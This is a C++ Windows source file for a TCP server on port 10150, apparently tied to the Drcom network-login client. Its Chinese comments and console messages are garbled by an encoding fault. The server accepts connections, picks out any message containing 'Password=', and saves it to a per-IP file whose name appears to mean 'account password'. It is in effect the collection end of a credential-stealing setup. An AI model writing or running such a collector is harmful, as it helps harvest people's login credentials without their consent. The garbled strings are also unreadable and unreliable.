// Drcom������ŷ�����.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include <winsock2.h>
#include <process.h>
#include <iostream>
#pragma comment(lib,"ws2_32.lib")
using namespace std;
//TCP
const int PORT = 10150;

void main()
{
	/////////////////////////////////////////////////////////////////////
	//Step1:
	WSADATA wd;
	WSAStartup(0x0202, &wd);
	/////////////////////////////////////////////////////////////////////
	//Step2:
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		cout << "����SOCKETʧ�ܣ��������=" << WSAGetLastError() << endl;
		return;
	}
	/////////////////////////////////////////////////////////////////////
	//Step3:
	sockaddr_in sa = { AF_INET,htons(PORT) };
	int nLen = sizeof(sa);
	int nRes = bind(sock, (sockaddr*)&sa, sizeof(sa));
	if (nRes == SOCKET_ERROR) {
		cout << "bind����ʧ�ܣ��������=" << WSAGetLastError() << endl;
		return;
	}
	while (true)
	{
		/////////////////////////////////////////////////////////////////////
		//Step4:
		cout << "����������ɹ����˿��ѿ�������ǰ״̬���Խ���" << endl;
		listen(sock, 5);
		SOCKET socka = accept(sock, (sockaddr*)&sa, &nLen);	//�շ�����3
		if (socka == INVALID_SOCKET) {
			cout << "Accept�������󣬴������=" << WSAGetLastError() << endl;
			return;
		}
		//���������
		cout << "�ͻ��˽��룺" << inet_ntoa(sa.sin_addr) << "��" << htons(sa.sin_port) << endl;
		char sAccept[1024 * 11] = { 0 };
		char FileName[64];
		string str;
		while ((nRes = recv(socka, sAccept, sizeof(sAccept) - 1, 0)) > 0)
		{
			sAccept[nRes] = '\0';
			str = sAccept;
			if (str.find("Password=") != string::npos) {
				cout << "����" << inet_ntoa(sa.sin_addr) << "���ļ��� " << endl << str.data() << endl;
				sprintf(FileName, "E:\\%s_�˺�����.txt", inet_ntoa(sa.sin_addr));
				FILE *fp = fopen(FileName, "wb");
				fwrite(str.data(), 1, str.length(), fp);
				cout << "�ɹ�д��: " << FileName << endl;
				fclose(fp);
			}
			else
				cout << "����" << inet_ntoa(sa.sin_addr) << "����Ϣ: " << str.data() << endl;
		}
		if (WSAGetLastError() == 10054)
			cout << inet_ntoa(sa.sin_addr) << " �ѶϿ����ӣ�" << endl << endl;
	}
	system("pause");
}